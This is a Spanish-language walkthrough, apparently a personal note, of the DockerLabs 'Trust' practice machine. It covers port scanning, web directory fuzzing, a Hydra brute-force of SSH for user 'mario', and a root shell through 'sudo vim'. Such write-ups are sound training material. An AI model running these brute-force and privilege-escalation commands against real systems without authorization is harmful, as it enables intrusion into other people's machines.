---
tags:
  - Cybersecurity
  - Labs
  - DockerLabs
  - Linux
  - HTTP
  - Hydra
  - SSH
  - Sudo
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Ping|Ping]]
	- [[#Enumeración#Nmap|Nmap]]
	- [[#Enumeración#Fuzzing Web|Fuzzing Web]]
- [[#Explotación|Explotación]]
	- [[#Explotación#HTTP|HTTP]]
	- [[#Explotación#Hydra|Hydra]]
	- [[#Explotación#SSH|SSH]]
	- [[#Explotación#Sudo|Sudo]]

---
# Resolviendo la máquina Trust

>En esta publicación, comparto cómo resolví la máquina **Trust** de [DockerLabs](https://dockerlabs.es/).

---
## Enumeración
### Ping

Ejecutamos un *ping* para comprobar la conectividad y obtener pistas sobre el sistema operativo.

`ping -c 1 172.18.0.2`

![[Pasted image 20250713134510.png]]

*TTL=63* -> **Linux**
### Nmap

Escaneo inicial de puertos.

`nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.18.0.2 -oG allPorts`

![[Pasted image 20250713134716.png]]

`nmap -p22,80 -sCV 172.18.0.2 -oN targets`

![[Pasted image 20250713134744.png]]
### Fuzzing Web

Se realiza **Fuzzing Web** para buscar directorios.

`gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://172.18.0.2 -x php,html,xml,txt,json`

![[Pasted image 20250713134844.png]]

---
## Explotación
### HTTP

`http://172.18.0.2/secret.php`

![[Pasted image 20250713134916.png]]
### Hydra

Se realiza un ataque de *fuerza bruta* sobre el servicio **SSH**.

`hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.2`

![[Pasted image 20250713135030.png]]
### SSH

Accedemos al sistema mediante **SSH** con las credenciales obtenidas.

`ssh mario@172.18.0.2`

![[Pasted image 20250713135121.png]]
### Sudo

`sudo -l`

![[Pasted image 20250713135206.png]]

Se realiza una búsqueda por  [GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/) para el permiso [vim](https://gtfobins.github.io/gtfobins/vim/#sudo).

![[Pasted image 20250713135338.png]]

`sudo vim -c ':!/bin/sh'`

![[Pasted image 20250713135404.png]]